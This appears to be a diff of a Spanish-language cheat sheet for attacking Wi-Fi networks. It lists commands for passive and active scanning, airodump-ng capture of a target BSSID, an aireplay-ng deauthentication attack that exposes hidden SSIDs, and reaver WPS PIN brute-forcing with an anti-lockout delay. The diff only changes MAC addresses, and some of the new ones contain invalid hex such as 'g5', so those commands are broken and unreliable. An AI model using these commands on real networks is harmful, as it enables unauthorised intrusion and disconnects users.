@@ -7,22 +7,22 @@ MODO MONITOR
 RECONOCIMIENTO PASIVO
 	sudo iw dev wlan0 scan passive | grep SSID
 REOCONOCIMIENTO ACTIVO
-	sudo iwlist wlan0 scan | grep SSID
+	sudo iwlist wlan0 scan | grep SSID 
 	
 MAPEAR REDES EN LINUX CON AIRODUMP-NG
 	sudo airodump-ng wlan0mon
 
 VER NOMBRE DE RED OCULTA
-       [captura] sudo airodump-ng --channel 1 --bssid 78:B4:6A:68:F5:88 wlan0mon
+       [captura] sudo airodump-ng --channel 1 --bssid c8:d4:6d:68:g5:48 wlan0mon
 	
-       [ataque]	sudo aireplay-ng -010 -a 78:B4:6A:68:F5:88  -c 18:70:3B:94:C9:9F wlan0mon
+       [ataque]	sudo aireplay-ng -010 -a c8:d4:6d:68:g5:48  -c 18:70:3B:94:C9:9d wlan0mon
 
 VER REDES CON WPS ACTIVADO
 	sudo iw wlan0 scan | egrep 'WPS|BSS|SSID' -w
 	sudo wash -i wlan0mon --ignore-fcs
 ATACAR REDES WPS
-	sudo reaver -b 10:50:72:DF:C5:85 -i wlan0mon
-	sudo reaver -b 10:50:72:DF:C5:85 -r3:30 -i wlan0mon ---> antibloqueo
+	sudo reaver -b c8:d4:6d:68:g5:48 -i wlan0mon
+	sudo reaver -b c8:d4:6d:68:g5:48 -r3:30 -i wlan0mon ---> antibloqueo
 
 ACTIVAR NUEVAMENTE SERVICIOS DE RED
 	sudo service network-manager start
